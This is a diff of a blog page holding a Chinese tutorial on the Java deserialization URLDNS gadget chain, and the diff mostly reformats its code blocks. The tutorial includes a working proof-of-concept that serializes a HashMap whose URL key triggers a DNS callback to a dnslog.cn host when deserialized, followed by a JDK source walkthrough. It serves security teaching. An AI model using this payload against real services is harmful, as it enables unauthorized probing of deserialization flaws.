@@ -88,6 +88,10 @@
           <a href="/archives/">Archives</a>
         </li>
       
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
         <li class="nav-item" data-path="/tags/">
           <a href="/tags/">Tags</a>
         </li>
@@ -162,6 +166,23 @@
           2022-06-09 09:43:07
         </span>
         
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/Web-Security/" title="Web Security">
+                    <b>#</b> Web Security
+                  </a>
+                </span>
+                
+                <span class="span--category">
+                  <a href="/categories/Web-Security/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="JAVA反序列化漏洞">
+                    <b>#</b> JAVA反序列化漏洞
+                  </a>
+                </span>
+                
+              </span>
+          
               <span class="post-tags">
                 <i class="iconfont icon-tags mr-10" title="Tags"></i>
                 
@@ -188,141 +209,141 @@
 <h1 id="简易利用链及利用方法"><a href="#简易利用链及利用方法" class="headerlink" title="简易利用链及利用方法"></a>简易利用链及利用方法</h1><h2 id="URLDNS平台"><a href="#URLDNS平台" class="headerlink" title="URLDNS平台"></a>URLDNS平台</h2><p>学习该章，推荐使用<a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn</a></p>
 <p>点击Get SubDomain可以得到一个域名。</p>
 <p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116201121893.png" alt="image-20211116201121893"></p>
-<h2 id="简易利用链"><a href="#简易利用链" class="headerlink" title="简易利用链"></a>简易利用链</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span></span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileOutputStream</span></span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
+<h2 id="简易利用链"><a href="#简易利用链" class="headerlink" title="简易利用链"></a>简易利用链</h2><pre><code class="java">import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.net.URL;
+import java.util.HashMap;
 
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">URLDNS</span> <span class="token punctuation">&#123;</span>
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
-        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span>URL<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span>URL<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 定义一个hashMap，key为URL,value为String</span>
-        <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://e3h66m.dnslog.cn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 设置我们触发dns查询的url</span>
+public class URLDNS &#123;
+    public static void main(String[] args) throws Exception &#123;
+        HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;();// 定义一个hashMap，key为URL,value为String
+        URL url = new URL(&quot;http://e3h66m.dnslog.cn&quot;);// 设置我们触发dns查询的url
         
-        <span class="token comment">// 下面在put前修改url的hashcode为非-1的值，put后将hashcode修改为-1</span>
-        <span class="token comment">// 1. 将url的hashCode字段设置为允许修改</span>
-        <span class="token class-name">Field</span> f <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.net.URL"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token comment">// 2. 设置url的hashCode字段为任意不为-1的值</span>
-        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取hashCode的值，验证是否修改成功</span>
-        <span class="token comment">// 3. 将 url 放入 hashMap 中，右边参数随便写</span>
-        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token string">""</span> <span class="token operator">+</span>
-                <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token comment">// 4. 修改url的hashCode字段为-1，为了触发DNS查询（之后会解释）</span>
-        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        // 下面在put前修改url的hashcode为非-1的值，put后将hashcode修改为-1
+        // 1. 将url的hashCode字段设置为允许修改
+        Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);
+        f.setAccessible(true);
+        // 2. 设置url的hashCode字段为任意不为-1的值
+        f.set(url, 111);
+        System.out.println(url.hashCode()); // 获取hashCode的值，验证是否修改成功
+        // 3. 将 url 放入 hashMap 中，右边参数随便写
+        hashMap.put(url, &quot;&quot; +
+                &quot;&quot;);
+        // 4. 修改url的hashCode字段为-1，为了触发DNS查询（之后会解释）
+        f.set(url, -1);
 
-        <span class="token comment">//序列化操作</span>
-        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"out.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        //序列化操作
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;));
+        oos.writeObject(hashMap);
 
-        <span class="token comment">//反序列化，触发payload</span>
-        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"out.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+        //反序列化，触发payload
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;));
+        ois.readObject();
+    &#125;
+&#125;
+</code></pre>
 <p>运行上述代码后，刷新DNSURL平台页面，发现已有记录 - 利用成功。</p>
 <h1 id="简易利用链分析-Java-1-7"><a href="#简易利用链分析-Java-1-7" class="headerlink" title="简易利用链分析(Java 1.7)"></a>简易利用链分析(Java 1.7)</h1><h2 id="HashMap-readObject"><a href="#HashMap-readObject" class="headerlink" title="HashMap.readObject()"></a>HashMap.readObject()</h2><p>我们在<code>ois.readObject()</code>处下断点，分析反序列化的过程。</p>
 <p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116201341776.png" alt="image-20211116201341776"></p>
 <p>利用点主要在<code>HashMap</code>类下的<code>readObject()</code>，之前我们有讲过，<code>readObject()</code>方法是可以被复写的，所以之前的代码中的<code>ois.readObject();</code>实际上会call到我们序列化的<code>HashMap</code>中的<code>readObject()</code>。</p>
 <p>跟进去看一下：</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ObjectInputStream</span> s<span class="token punctuation">)</span>
-     <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span>
-<span class="token punctuation">&#123;</span>
-    s<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//此处执行默认的readObject()方法</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span>loadFactor <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token class-name">Float</span><span class="token punctuation">.</span><span class="token function">isNaN</span><span class="token punctuation">(</span>loadFactor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//判断loadFactor的值是否合法</span>
-        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidObjectException</span><span class="token punctuation">(</span><span class="token string">"Illegal load factor: "</span> <span class="token operator">+</span>
-                                           loadFactor<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
+<pre><code class="java">private void readObject(java.io.ObjectInputStream s)
+     throws IOException, ClassNotFoundException
+&#123;
+    s.defaultReadObject();//此处执行默认的readObject()方法
+    if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) &#123;//判断loadFactor的值是否合法
+        throw new InvalidObjectException(&quot;Illegal load factor: &quot; +
+                                           loadFactor);
+    &#125;
 
-    <span class="token comment">// 初始化一个空表</span>
-    table <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> EMPTY_TABLE<span class="token punctuation">;</span>
+    // 初始化一个空表
+    table = (Entry&lt;K,V&gt;[]) EMPTY_TABLE;
 
-    s<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取key-value的个数</span>
+    s.readInt(); // 获取key-value的个数
 
-    <span class="token keyword">int</span> mappings <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span>mappings <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">//判断个数值是否合法</span>
-        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidObjectException</span><span class="token punctuation">(</span><span class="token string">"Illegal mappings count: "</span> <span class="token operator">+</span>
-                                           mappings<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    int mappings = s.readInt();
+    if (mappings &lt; 0)//判断个数值是否合法
+        throw new InvalidObjectException(&quot;Illegal mappings count: &quot; +
+                                           mappings);
 
-    <span class="token comment">//下面初始化Capacity</span>
-    <span class="token keyword">int</span> capacity <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>
-                mappings <span class="token operator">*</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">/</span> loadFactor<span class="token punctuation">,</span> <span class="token number">4.0f</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
-                <span class="token comment">// we have limits...</span>
-                <span class="token class-name">HashMap</span><span class="token punctuation">.</span>MAXIMUM_CAPACITY<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    //下面初始化Capacity
+    int capacity = (int) Math.min(
+                mappings * Math.min(1 / loadFactor, 4.0f),
+                // we have limits...
+                HashMap.MAXIMUM_CAPACITY);
 
-    <span class="token comment">// allocate the bucket array;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span>mappings <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token function">inflateTable</span><span class="token punctuation">(</span>capacity<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
-        threshold <span class="token operator">=</span> capacity<span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
+    // allocate the bucket array;
+    if (mappings &gt; 0) &#123;
+        inflateTable(capacity);
+    &#125; else &#123;
+        threshold = capacity;
+    &#125;
 
-    <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Give subclass a chance to do its thing.</span>
+    init();  // Give subclass a chance to do its thing.
 
-    <span class="token comment">// Read the keys and values, and put the mappings in the HashMap</span>
-    <span class="token comment">//获取keys和values，并进行PUT操作</span>
-    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> mappings<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token class-name">K</span> key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">K</span><span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取key</span>
-        <span class="token class-name">V</span> value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">V</span><span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取value</span>
-        <span class="token function">putForCreate</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//重点在此处</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+    // Read the keys and values, and put the mappings in the HashMap
+    //获取keys和values，并进行PUT操作
+    for (int i = 0; i &lt; mappings; i++) &#123;
+        K key = (K) s.readObject();//获取key
+        V value = (V) s.readObject();//获取value
+        putForCreate(key, value);//重点在此处
+    &#125;
+&#125;
+</code></pre>
 <h2 id="putForCreate"><a href="#putForCreate" class="headerlink" title="putForCreate()"></a>putForCreate()</h2><p>继续跟进<code>putForCreate(key,value)</code></p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">putForCreate</span><span class="token punctuation">(</span><span class="token class-name">K</span> key<span class="token punctuation">,</span> <span class="token class-name">V</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-    <span class="token keyword">int</span> hash <span class="token operator">=</span> <span class="token keyword">null</span> <span class="token operator">==</span> key <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//*判断key是否为空，如果不为空，计算key的hash值*</span>
-    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">indexFor</span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> table<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<pre><code class="java">private void putForCreate(K key, V value) &#123;
+    int hash = null == key ? 0 : hash(key);//*判断key是否为空，如果不为空，计算key的hash值*
+    int i = indexFor(hash, table.length);
 
-    <span class="token comment">/**
+    /**
      * Look for preexisting entry for key.  This will never happen for
      * clone or deserialize.  It will only happen for construction if the
      * input Map is a sorted map whose ordering is inconsistent w/ equals.
-     */</span>
-    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span> e <span class="token operator">=</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> e <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token punctuation">.</span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token class-name">Object</span> k<span class="token punctuation">;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>hash <span class="token operator">==</span> hash <span class="token operator">&amp;&amp;</span>
-            <span class="token punctuation">(</span><span class="token punctuation">(</span>k <span class="token operator">=</span> e<span class="token punctuation">.</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> key <span class="token operator">||</span> <span class="token punctuation">(</span>key <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> key<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            e<span class="token punctuation">.</span>value <span class="token operator">=</span> value<span class="token punctuation">;</span>
-            <span class="token keyword">return</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
+     */
+    for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123;
+        Object k;
+        if (e.hash == hash &amp;&amp;
+            ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) &#123;
+            e.value = value;
+            return;
+        &#125;
+    &#125;
 
-    <span class="token function">createEntry</span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+    createEntry(hash, key, value, i);
+&#125;
+</code></pre>
 <h2 id="hash"><a href="#hash" class="headerlink" title="hash()"></a>hash()</h2><p>注意我们这里call的是<code>hash(key)</code>，我们看看<code>hash()</code>是怎么实现的。</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token function">hash</span><span class="token punctuation">(</span><span class="token class-name">Object</span> k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//此处k为我们传入的HashMap的key</span>
-    <span class="token keyword">int</span> h <span class="token operator">=</span> hashSeed<span class="token punctuation">;</span><span class="token comment">//此处会获取hashSeed（默认为0）</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">!=</span> h <span class="token operator">&amp;&amp;</span> k <span class="token keyword">instanceof</span> <span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//如果hashSeed不为0，且传入的Object为String的话执行下面代码</span>
-        <span class="token keyword">return</span> <span class="token class-name"><span class="token namespace">sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span></span>Hashing</span><span class="token punctuation">.</span><span class="token function">stringHash32</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
+<pre><code class="java">final int hash(Object k) &#123;//此处k为我们传入的HashMap的key
+    int h = hashSeed;//此处会获取hashSeed（默认为0）
+    if (0 != h &amp;&amp; k instanceof String) &#123;//如果hashSeed不为0，且传入的Object为String的话执行下面代码
+        return sun.misc.Hashing.stringHash32((String) k);
+    &#125;
 
-    h <span class="token operator">^=</span> k<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//否则执行传入的object的hashCode</span>
+    h ^= k.hashCode();//否则执行传入的object的hashCode
 
-    <span class="token comment">// This function ensures that hashCodes that differ only by</span>
-    <span class="token comment">// constant multiples at each bit position have a bounded</span>
-    <span class="token comment">// number of collisions (approximately 8 at default load factor).</span>
-    h <span class="token operator">^=</span> <span class="token punctuation">(</span>h <span class="token operator">>>></span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>h <span class="token operator">>>></span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">return</span> h <span class="token operator">^</span> <span class="token punctuation">(</span>h <span class="token operator">>>></span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>h <span class="token operator">>>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+    // This function ensures that hashCodes that differ only by
+    // constant multiples at each bit position have a bounded
+    // number of collisions (approximately 8 at default load factor).
+    h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12);
+    return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);
+&#125;
+</code></pre>
 <h2 id="hashCode"><a href="#hashCode" class="headerlink" title="hashCode()"></a>hashCode()</h2><p><strong>重点</strong>：很明显，<code>k.hashCode()</code>是指URL类的hashCode()方法，因为我们传入的是URL object，所以我们需要跟踪<code>URL.hashCode();</code></p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span>hashCode <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//如果hashCode不等于-1，那么我们就返回hashCode</span>
-        <span class="token keyword">return</span> hashCode<span class="token punctuation">;</span>
+<pre><code class="java">public synchronized int hashCode() &#123;
+    if (hashCode != -1)//如果hashCode不等于-1，那么我们就返回hashCode
+        return hashCode;
 
-    hashCode <span class="token operator">=</span> handler<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//否则调用 handler.hashCode() 计算 hash 值 .</span>
-    <span class="token keyword">return</span> hashCode<span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+    hashCode = handler.hashCode(this);//否则调用 handler.hashCode() 计算 hash 值 .
+    return hashCode;
+&#125;
+</code></pre>
 <p>此时我们仍然没有发现有触发DNS请求的地方，如果hashCode不等于-1，直接返回hashCode，我们的这条链就走不下去了，所以我们得保证<strong>hashCode等于-1</strong>，这样我们才能执行<code>handler.hashCode(this);</code></p>
 <p>由代码可知，hashCode默认值为-1</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">int</span> hashCode <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
+<pre><code class="java">private int hashCode = -1;
+</code></pre>
 <p>但是当我们通过 <code>HashMap.readObject()</code> 方法获取 key 的值时 ,key 的HashCode 就不会为 <code>-1</code> 了（注释掉前面利用链代码中修改hashCode的部分进行断点调试），如下图：</p>
 <p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116204410674.png" alt="image-20211116204410674"></p>
 <p>所以我们需要手动修改HashCode，让它为-1 - 这也是为什么简易利用链中用<code>f.set(url, -1);</code>设置hashCode为-1。但同时我们发现，在生成payload时的<code>put()</code>函数也会经过这条链：</p>
@@ -331,64 +352,64 @@
 <p>但我们不能让他在生成payload的时候就发送URLDNS请求，所以我们可以在生成payload - **执行hashMap.put()**之前改变hashCode的值，让它不为-1，在put完之后再改回-1方便payload被执行。</p>
 <p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116210115810.png" alt="image-20211116210115810"></p>
 <h2 id="handler-hashCode"><a href="#handler-hashCode" class="headerlink" title="handler.hashCode()"></a>handler.hashCode()</h2><p>继续跟进<code>hashCode = handler.hashCode(this);</code></p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token class-name">URL</span> u<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-    <span class="token keyword">int</span> h <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<pre><code class="java">protected int hashCode(URL u) &#123;
+    int h = 0;
 
-    <span class="token comment">// Generate the protocol part.</span>
-    <span class="token class-name">String</span> protocol <span class="token operator">=</span> u<span class="token punctuation">.</span><span class="token function">getProtocol</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取协议</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span>protocol <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
-        h <span class="token operator">+=</span> protocol<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    // Generate the protocol part.
+    String protocol = u.getProtocol();//获取协议
+    if (protocol != null)
+        h += protocol.hashCode();
 
-    <span class="token comment">// Generate the host part.</span>
-    <span class="token class-name">InetAddress</span> addr <span class="token operator">=</span> <span class="token function">getHostAddress</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取地址</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span>addr <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
